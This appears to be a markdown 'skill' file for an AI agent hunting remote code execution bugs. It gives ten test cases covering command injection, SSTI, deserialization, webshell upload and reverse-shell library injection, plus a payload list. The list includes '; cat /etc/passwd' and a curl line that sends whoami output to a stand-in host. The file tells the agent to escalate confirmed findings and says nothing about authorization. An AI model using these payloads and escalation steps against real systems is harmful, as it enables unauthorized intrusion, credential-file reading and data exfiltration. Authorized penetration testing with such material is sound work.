# RCE Hunting Skill — 10 Test Cases

> Load when: RCE, command injection, remote code execution, code injection, eval injection.

## 110. OS command injection (easy)
For every parameter, test: `; ls`, `| ls`, `` `ls` ``, `$(ls)`, `&& ls`, `|| ls`. Diff responses. Report any command execution.

## 111. Blind command injection via time delay (medium)
Send `; sleep 5`, `| sleep 5`, `$(sleep 5)`. Compare response times. Report confirmed blind command injection.

## 112. Blind command injection via DNS (hard)
Send `; nslookup yourdomain.com`, `| ping yourdomain.com`. Check DNS logs for callback.

## 113. Code injection via eval() (medium)
If input is passed to `eval()`, `Function()`, `exec()`, `system()`, `os.popen()`, inject: `1+1` to confirm code execution, then escalate.

## 114. RCE via file upload (hard)
Upload `.php`, `.py`, `.jsp`, `.sh` files. If served or executed, confirm RCE. Test webshell upload with obfuscated filenames.

## 115. RCE via template injection + SSTI (hard)
If SSTI is confirmed, escalate to RCE by injecting `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` (Jinja2) or equivalent.

## 116. RCE via deserialization (hard)
Send serialized object with `os.system('id')` or `Runtime.exec('id')` payload. Confirm command execution.

## 117. RCE via cron job manipulation (medium)
If app writes to crontab, log rotation configs, or scheduled task files, inject command execution payloads.

## 118. RCE via environment variable injection (medium)
If app reads user-controlled environment variables (e.g., `LANG`, `TZ`), inject command payloads.

## 119. RCE via shared library injection (hard)
If app loads user-controlled `.so` or `.dll` files, inject reverse shell payload.

---

## Command Injection Payloads
```
; ls
| ls
`ls`
$(ls)
&& ls
|| ls
; cat /etc/passwd
| cat /etc/passwd
; sleep 5
| sleep 5
; nslookup yourdomain.com
| ping yourdomain.com
; curl http://yourdomain.com/$(whoami)
```

## Linux Command Chains
| Operator | Description |
|----------|-------------|
| `;` | Execute sequentially |
| `|` | Pipe output |
| `&&` | Execute if previous succeeds |
| `\|\|` | Execute if previous fails |
| `` `cmd` `` | Command substitution |
| `$(cmd)` | Command substitution |
| `{cmd}` | Brace expansion |
